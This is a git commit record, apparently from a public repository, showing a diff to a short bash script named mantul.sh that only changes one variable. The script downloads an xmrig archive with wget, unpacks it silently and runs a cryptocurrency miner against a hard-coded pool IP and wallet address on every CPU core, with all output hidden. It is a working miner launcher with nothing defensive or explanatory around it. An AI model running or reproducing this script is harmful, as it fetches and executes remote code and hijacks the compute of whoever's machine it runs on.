820294b72db9b6c060e10432901237884339f8d6
ganggamulyana08 <ganggamulyana08@gmail.com>
2024-08-04 00:44:47 +0700

    Update mantul.sh

--- mantul.sh
+++ mantul.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 A=157.230.255.104:443
 B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
-C=GAS
+C=LAPET
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
 ./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
